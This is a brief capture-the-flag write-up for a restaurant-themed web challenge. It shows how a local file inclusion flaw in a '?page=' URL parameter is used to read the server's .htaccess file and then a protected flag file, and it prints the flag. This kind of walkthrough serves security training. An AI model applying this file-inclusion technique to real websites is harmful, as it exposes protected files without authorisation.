**Catergory** - Web | **Points** - 100

## Description:  
We are creating a new web-site for our restaurant. Can you check if it is secure enough?

### Solution:  
Upon visiting the site, checking the source of the home page reveals:
```
<!-- TODO: Check apache access and error log for errors -->
```
So we know we might be facing an LFI to try and access 'apache access' or the 'error log'.

Now, clicking one the navigation links shows us the structure of the URL
```
http://bonappetit.stillhackinganyway.nl/?page=home
```
Maybe ``?page=home`` is vulnerable to LFI?

It sure is, visiting ``http://bonappetit.stillhackinganyway.nl/?page=.htaccess`` it reveals the following:
```
<FilesMatch "\.(htaccess|htpasswd|sqlite|db)$">
 Order Allow,Deny
 Deny from all
</FilesMatch>

<FilesMatch "\.phps$">
 Order Allow,Deny
 Allow from all
</FilesMatch>

<FilesMatch "suP3r_S3kr1t_Fl4G">
  Order Allow,Deny
  Deny from all
</FilesMatch>


# disable directory browsing
Options -Indexes
```
Hmm, no flag but we do see ``suP3r_S3kr1t_Fl4G``, let's try accessing that file.

Yep, that file reveals the flag :)
``flag{82d8173445ea865974fc0569c5c7cf7f}``
